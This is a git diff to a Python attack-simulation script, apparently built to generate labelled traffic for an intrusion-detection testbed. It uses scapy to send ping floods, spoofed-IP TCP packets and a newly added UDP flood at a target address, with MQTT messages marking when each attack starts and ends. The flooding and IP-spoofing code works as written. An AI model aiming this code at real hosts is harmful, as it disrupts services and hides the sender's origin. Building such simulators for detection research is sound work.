@@ -1,7 +1,8 @@
 import random
 from time import sleep
 import paho.mqtt.client as mqtt
-from scapy.all import IP, TCP, send, ICMP
+
+from scapy.all import IP, TCP, send, ICMP, UDP
 import uuid
 
 
@@ -18,7 +19,7 @@ def send_attack_notification(attack_type, attack_id, is_start=True):
     print(f"Sent notification for {message}")
 
 def simulate_attack(target_ip):
-    attack_type = random.choice(['ddos', 'ping_flood', 'mitm'])
+    attack_type = random.choice(['ddos', 'ping_flood', 'mitm', 'udp_flood'])
     attack_id = str(uuid.uuid4())  # Générer un ID unique pour cette attaque
     print(f"Simulating {attack_type.upper()} attack with ID {attack_id}")
 
@@ -47,11 +48,18 @@ def simulate_attack(target_ip):
             spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
             # Falsification des adresses IP pour imiter l'IP de la victime
             if random.random() > 0.5:
-                packet = IP(src=victim_ip, dst=target_ip) / TCP(flags="A", seq=random.randint(1000, 10000),
+                packet = IP(src=victim_ip, dst=target_ip) / TCP(seq=random.randint(1000, 10000),
                                                                 ack=random.randint(1000, 10000))
             else:
-                packet = IP(src=target_ip, dst=victim_ip) / TCP(flags="A", seq=random.randint(1000, 10000),
+                packet = IP(src=target_ip, dst=victim_ip) / TCP(seq=random.randint(1000, 10000),
                                                                 ack=random.randint(1000, 10000))
+            send(packet, verbose=0)
+
+    elif attack_type == 'udp_flood':
+        nombre_paquets = random.randint(100, 2000)
+        print("Simulating UDP Flood")
+        for _ in range(nombre_paquets):
+            packet = IP(dst=target_ip) / UDP(dport=random.randint(1, 65535))
             send(packet, verbose=0)
 
     send_attack_notification(attack_type, attack_id, is_start=False)
